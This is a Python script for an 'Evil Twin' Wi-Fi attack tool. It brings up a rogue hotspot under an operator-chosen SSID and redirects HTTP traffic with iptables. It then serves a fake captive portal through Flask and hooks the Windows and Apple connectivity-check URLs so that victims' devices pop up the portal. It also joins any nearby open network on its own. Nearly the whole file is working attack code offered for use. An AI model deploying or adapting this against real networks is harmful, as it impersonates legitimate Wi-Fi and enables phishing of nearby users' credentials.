#IMPORTS 
#test - sudo PYTHONPATH=. python Modes/EvilTwin/evil_twin.py
import os 
import time
import sys
import textwrap
import subprocess
from flask import Flask, render_template
from EvilTwin_info import selected_options
preset = selected_options


#For comands like stop procesess  -- "systemctl", "stop", "NetworkManager  
def cmd(comand, ignore_error = False): # ignore_error so the script dont fail if we are trying to turn off a function that isnt even on
    result = subprocess.run(comand, capture_output=True, text=True)
    if result.returncode !=0 and not ignore_error:
          print(f"ERROR: {result.stderr.strip()}")
          sys.exit(1)
    return result     

#Configruration
PORTAL_IP = "192.168.4.1"
IFACE_INTERNET = "wlan1"
IFACE_AP = selected_options['WLAN']
WIFI_SSID = selected_options["SSID"]
PORTAL = selected_options["PORTAL"]

def configure_iptables():
    rule = [
        "iptables",
        "-t", "nat",
        "-A", "PREROUTING",
        "-i", IFACE_AP,
        "-p", "tcp",
        "--dport", "80",
        "-j", "REDIRECT",
        "--to-ports", "80"
    ]

    check = [
        "iptables",
        "-t", "nat",
        "-C", "PREROUTING",
        "-i", IFACE_AP,
        "-p", "tcp",
        "--dport", "80",
        "-j", "REDIRECT",
        "--to-ports", "80"
    ]

    result = subprocess.run(
        check,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        result = subprocess.run(
            rule,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            print(f"iptables ERROR: {result.stderr.strip()}")
            sys.exit(1)
    

#This funkcion connects to the open wifi network that is available in the area. This is useful if you want to use the internet while running the Evil Twin attack.
def connect_open_wifi():
    #HOME WIFI - Wlan1 feature: connects to your home wifi that was previously connected to, so you can still use the internet while running the Evil Twin attack.
    cmd(["nmcli", "connection", "up", "$(nmcli -g GENERAL.CONNECTION device show wlan0)", "ifname", IFACE_INTERNET], ignore_error=True,)


    #If home wifi is not connected, it will try to connect to the strongest open wifi network available.
    cmd(["nmcli", "device", "wifi", "rescan", "ifname", IFACE_INTERNET], ignore_error=True)
    vystup = cmd(["nmcli", "--terse", "--fields", "SSID", "device", "wifi", "list", "ifname", IFACE_INTERNET, "--filter", "SECURITY.SECURITY==--"], ignore_error=True)
    site = [line.strip() for line in vystup.stdout.split("\n") if line.strip() and line.strip() != "--"]
    strongest_open_wifi = site[0] if site else None
    if strongest_open_wifi:
        cmd(["nmcli", "device", "wifi", "connect", strongest_open_wifi, "ifname", IFACE_INTERNET], ignore_error=True)


def starting_services():
     #This deletes the Hotspot connection if it already exists, so we can prevent any collisions with the new Hotspot connection we are about to create.
     cmd(["nmcli", "connection", "delete", "Hotspot"], ignore_error=True)
     cmd(["nmcli", "connection", "add", "type", "wifi", "ifname", IFACE_AP, "con-name", "Hotspot", "ssid", WIFI_SSID]); 
     cmd(["nmcli", "connection", "modify", "Hotspot", "802-11-wireless.mode", "ap", "ipv4.method", "shared", "ipv4.addresses", "192.168.4.1/24", "connection.autoconnect", "no"]); 
     cmd(["nmcli", "connection", "up", "Hotspot"])
     print("Step 1 DONE services are running ")


base_dir = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
def show_portal():
    return render_template(PORTAL)

# Normal HTTP detection requests
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def captive_portal(path=""):
    return show_portal()

# Windows captive portal detection requests
@app.route("/connecttest.txt")
@app.route("/ncsi.txt")
def windows_captive_test():
    return show_portal()

#Apple captive portal detection requests
@app.route("/hotspot-detect.html")
def apple_captive_test():
    return show_portal()

def start_portal():
     print("Starting web server on port 80...")
     app.run(host="0.0.0.0", port=80, debug=True, use_reloader=False)

     print("PORTAL =", PORTAL)
     print("TEMPLATE FOLDER =", os.path.join(base_dir, "templates"))


def main():
    connect_open_wifi()
    starting_services()
    configure_iptables()
    start_portal() 
    print("Starting Evil_Twin.py Portal") 

if __name__ == "__main__":
    main()

#Captive portal is working...
